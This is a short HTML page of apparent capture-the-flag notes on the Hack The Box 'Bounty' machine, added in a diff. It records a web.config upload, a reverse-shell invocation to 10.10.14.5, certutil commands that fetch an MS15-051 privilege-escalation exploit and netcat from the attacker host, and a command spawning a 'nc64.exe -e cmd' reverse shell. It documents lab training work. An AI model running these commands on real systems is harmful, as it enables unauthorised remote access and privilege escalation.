@@ -1,0 +1,29 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>20.Bounty</title>
+</head><body>nmap scan results<br/>
+<img src="image.png" /><br/>
+<br/>
+https://www.hackingarticles.in/command-and-control-guide-to-merlin/<br/>
+<br/>
+using this side as the home page displayed this image <br/>
+<img src="image 2.png" width="524" height="350" /><br/>
+<br/>
+coz merlin was mentioned in page source <br/>
+used dirbuster and found following directories<br/>
+<img src="image 3.png" /><br/>
+<br/>
+so well create web.config file and upload it <br/>
+invoke -Reverse -IPAddress 10.10.14.5 -Port 4444<br/>
+<br/>
+<img src="image 4.png" /><br/>
+<br/>
+https://ech1.netlify.app/htb/easy/19<br/>
+<br/>
+<br/>
+certutil -urlcache -f http://10.10.14.5:8000/ms15-051.exe ech0_privesc.exe<br/>
+certutil -urlcache -f http://10.10.14.5:8000/netcat-1.11/nc64.exe nc64.exe<br/>
+./ech0_privesc.exe "c:\windows\temp\nc64.exe -e cmd 10.10.14.5 9999"<br/>
+</body></html>
